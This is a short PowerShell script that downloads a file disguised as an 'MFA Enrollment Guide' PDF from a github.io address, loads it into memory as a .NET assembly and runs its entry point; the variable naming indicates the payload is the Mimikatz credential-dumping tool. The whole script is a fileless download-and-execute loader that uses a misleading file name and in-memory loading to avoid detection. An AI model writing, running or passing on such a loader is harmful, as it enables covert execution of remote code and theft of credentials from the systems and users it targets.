[String]$param = ""
[String[]]$parameter = @(, $param)

# Read the assembly from disk into a byte array
$assemblyByte = (New-Object Net.WebClient).DownloadData("https://hakkyahud.github.io/MFA_Enrollment_Guide_for_users.pdf")
#[Byte[]]$assemblyByte = [System.IO.File]::ReadAllBytes(".\explorer.exe")
# Load the assembly
$assembly = [System.Reflection.Assembly]::Load($assemblyByte)
# Find the Entrypoint or "Main" method
$entryPoint = $assembly.EntryPoint
# Get Parameters
$parameter_invoke = (, $parameter )

# Invoke the method with the specified parameters
$mimikatz = $entryPoint.Invoke($null, $null) # Wrap the inner aray in another array litteral expression